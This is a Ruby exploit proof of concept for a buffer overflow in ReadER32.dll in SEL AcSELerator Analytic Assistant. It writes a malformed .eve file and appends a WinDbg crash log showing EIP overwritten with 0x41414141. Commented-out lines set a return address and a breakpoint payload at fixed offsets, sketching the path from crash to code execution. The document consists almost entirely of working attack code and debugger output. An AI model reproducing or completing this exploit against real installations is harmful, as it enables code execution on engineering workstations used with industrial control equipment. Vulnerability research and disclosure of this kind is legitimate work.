#!/usr/bin/env ruby
# AcSELerator Analytic Assistant (2.3.23.0) contains a
# buffer overflow in ReadER32.dll (1.8.3.5). The access
# violation will occur when the 2 Event Field is clicked.

require 'rex'

fd = File.open("template.eve", "rb" )
new_eve = fd.read(fd.stat.size)
fd.close

p = "\xcc" * 200

data = "A" * 1024
#data = Rex::Text.rand_text_alpha_upper(9024)
#data[80, 4] = [0x10079148].pack('V')
#data[84, p.size] = p.force_encoding("ASCII-8BIT")

fuzz = new_eve

x = File.new("fuzz.eve","wb")
x.write(fuzz.gsub(/FUZZER/, data))
x.close
__END__
(af8.274): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=0000003c ecx=00000001 edx=0012ebef esi=0012ebf0 edi=01c21e80
eip=41414141 esp=0012eabc ebp=000000ff iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
41414141 ??              ???
0:000> dd esp
0012eabc  41414141 41414141 41414141 41414141
0012eacc  41414141 41414141 41414141 41414141
0012eadc  41414141 41414141 41414141 41414141
0012eaec  41414141 41414141 41414141 41414141
0012eafc  41414141 41414141 41414141 41414141
0012eb0c  41414141 41414141 41414141 41414141
0012eb1c  41414141 41414141 41414141 41414141
0012eb2c  41414141 41414141 41414141 41414141
0:000> kv
ChildEBP RetAddr  Args to Child              
WARNING: Frame IP not in any known module. Following frames may be wrong.
0012eab8 41414141 41414141 41414141 41414141 0x41414141
0012eabc 41414141 41414141 41414141 41414141 0x41414141
0012eac0 41414141 41414141 41414141 41414141 0x41414141
0012eac4 41414141 41414141 41414141 41414141 0x41414141
0012eac8 41414141 41414141 41414141 41414141 0x41414141
0012eacc 41414141 41414141 41414141 41414141 0x41414141
0012ead0 41414141 41414141 41414141 41414141 0x41414141
0012ead4 41414141 41414141 41414141 41414141 0x41414141
0012ead8 41414141 41414141 41414141 41414141 0x41414141
0012eadc 41414141 41414141 41414141 41414141 0x41414141
0012eae0 41414141 41414141 41414141 41414141 0x41414141
0012eae4 41414141 41414141 41414141 41414141 0x41414141
0012eae8 41414141 41414141 41414141 41414141 0x41414141
0012eaec 41414141 41414141 41414141 41414141 0x41414141
0012eaf0 41414141 41414141 41414141 41414141 0x41414141
0012eaf4 41414141 41414141 41414141 41414141 0x41414141
0012eaf8 41414141 41414141 41414141 41414141 0x41414141
*** WARNING: Unable to verify checksum for C:\Program Files\SEL\AcSELerator\Analytic Assistant\ReadER32.DLL
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\SEL\AcSELerator\Analytic Assistant\ReadER32.DLL - 
0012ebf8 01bf1a7c 01c0f4d0 00000000 00000000 0x41414141
00000000 00000000 00000000 00000000 00000000 ReadER32!SetEmbeddedQuoteCharacter+0x125c

